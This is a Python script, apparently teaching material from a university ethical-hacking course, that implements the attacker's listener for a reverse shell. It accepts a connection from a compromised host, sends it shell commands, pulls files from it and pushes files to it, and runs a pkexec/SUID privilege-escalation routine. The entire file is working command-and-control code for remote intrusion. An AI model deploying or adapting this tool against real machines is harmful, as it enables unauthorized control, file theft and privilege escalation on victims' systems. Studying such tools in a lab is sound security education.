################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

import socket
import json
import os
import time

target_ip = "192.168.56.1"
target_port = 5021

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break
        target.settimeout(None)

def target_communication():
    dir = ''
    while True:
        command = input(f'* Shell~{str(ip)}: {dir}$ ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            dir = reliable_recv() + ' '
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == "escalate": # Run by `escalate {username}`
            user = command[9:]
            print(f"Escalating privileges of USER:{user} with pkexec...")
            osname = reliable_recv()
            print(f"This is OS NAME:{osname}")
            if osname == 'posix':
                SUID = reliable_recv()
                print(f"Result from checking SUID: {SUID}")
                if "Found" in SUID:
                    print("Starting Escalation")
                    while True:
                        check = reliable_recv()
                        print(check)
                        if check == "USER has already input PASS":
                            break
                    result = reliable_recv()
                    print(result)
                else:
                    print(reliable_recv())
            else:
                print("Escalation Failed B/C not posix system")
        elif command == "sudo su -l":
            print(command)
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((target_ip, target_port))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
